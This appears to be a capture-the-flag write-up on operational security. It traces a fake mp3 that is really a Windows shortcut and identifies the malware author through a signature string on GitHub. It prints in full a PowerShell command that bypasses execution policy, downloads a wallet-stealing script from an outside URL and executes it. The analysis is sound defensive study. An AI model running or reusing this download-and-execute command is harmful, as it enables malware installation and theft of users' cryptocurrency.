# Day 1: OPSEC

## OPSEC : Operational Security

**Definition :**
OPSEC is the principles and tactics to assure the security of an operator/operation by :
1. Identifying the valuable assets and possible threats to it
2. Figuring out how they can be exposed
3. Taking steps to secure them

**OPSEC failures :**
Practices that can cause you being compromised  , tracked or identified , such as using real usernames , photos , emails ....

## Our case :
Websites such as youtube/mp3 converters can have risks such as : malvertising , phishing scams , bundled malware ...

After connecting to he machine :
downloading an mp3 file (somg.mp3) from what it looks like a legitimate website

1. we analyze this file using the commands : `file` & `exiftool`

In our case : 

`file somg.mp3`

→ shows that the file isn’t an mp3 file (even if the extension is mp3) , but it is a shortcut (.lnk : file that redirects to another file/directory)

`exiftool somg.mp3` 

→ shows the metadata of the file , and it shows that it is opening the powershell of windows and inside it executing a command : 

```powershell
**-ep Bypass -nop -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1','C:\ProgramData\s.ps1'); iex (Get-Content 'C:\ProgramData\s.ps1' -Raw)"**
```

1. analyzing this command : 
    
     **`-ep Bypass -nop -c` : bypass :** disabling all the restriction for the next script
    
     `“(……….)”` : the script : downloading a file (**.DownloadFile**) from a remote server (**https://raw.github……../IS.ps1**) into a directory  (**C:\ProgramData\s.ps1**)
    
2. We have then to visit the file from the remote server since we have its link , and we can find that it’s a script that collect sensitive informations (cryptocurrency wallets) , and by analyzing this script , we can find a clue , a line that said : **`Write-Host "   Created by the one and only M.M."`**
    
    ! that can give us a clue about who wrote that code , so we have to do our search !
    
3. one of the first places to search in when it comes to codes is **GitHub** !!
    
    doing the search of on “**Created by the one and only M.M”** github open the doors of heaven for us : with simple navigation on repositories and codes and users , we can find the real author of code 
    

! and that was an example of a very fatal OPSEC failure !!
